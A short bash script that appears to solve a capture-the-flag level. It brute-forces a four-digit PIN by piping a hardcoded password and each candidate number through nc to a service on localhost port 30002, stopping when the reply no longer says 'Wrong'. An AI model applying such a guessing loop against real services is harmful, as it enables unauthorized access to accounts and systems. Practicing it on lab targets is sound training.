pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {1000..10000}
do {
if 
    echo $pass $i | nc localhost 30002 | grep Wrong > /dev/null
then 
    echo $i
else
    echo $pass $i | nc localhost 30002
    exit
fi
}
done
